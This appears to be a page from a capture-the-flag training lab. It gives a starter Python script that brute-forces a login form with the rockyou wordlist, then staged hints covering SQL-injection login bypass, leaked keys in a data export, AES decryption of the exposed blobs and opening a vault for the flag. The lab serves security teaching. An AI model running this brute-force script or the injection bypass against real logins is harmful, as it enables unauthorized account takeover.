{% icon "code" "icon" %} Starter script (brute-force)
import requests

URL      = "{{ request.scheme }}://{{ request.get_host }}/portal/login/"
USERNAME = "{{ target.username }}"

with open("rockyou.txt", encoding="latin-1", errors="ignore") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        r = requests.post(URL, json={"username": USERNAME, "password": password})
        if r.json().get("success"):
            print("FOUND:", password)
            break

Download rockyou.txt (a standard wordlist), put it next to this script, and run it. Ask the AI assistant or search online if you get stuck at any stage.

{% icon "book" "icon" %} Hints
Stage 1 — getting in

Two ways in: brute-force the password with a wordlist (rockyou), or SQL-injection. The login is a classic vulnerable form — search "SQL injection login bypass".

Stage 2 — the vault is locked

The vault says to rotate your password first. Look in Profile → Data while you're there.

Stage 3 — the data export

"Download my data" gives a JSON file. It over-shares: it includes two secrets (account_key, vault_key) and two encrypted blobs (account_blob, vault_blob).

Stage 4 — decrypt the credentials

Each blob is AES-256. Website: open an "aes256" decrypt tool (e.g. encode-decode.com), paste a blob as the text and its matching key (account_key/vault_key) as the secret, hit Decrypt. Or open the bundled tools/vaultline_decrypt.html, or run tools/decrypt_vault.py. vault_blob + vault_key → the vault id + password for Stage 5.

Stage 5 — open the vault

Rotate your password (unlocks the input), then type the decrypted vault id + vault password. Download the file — the flag is inside.
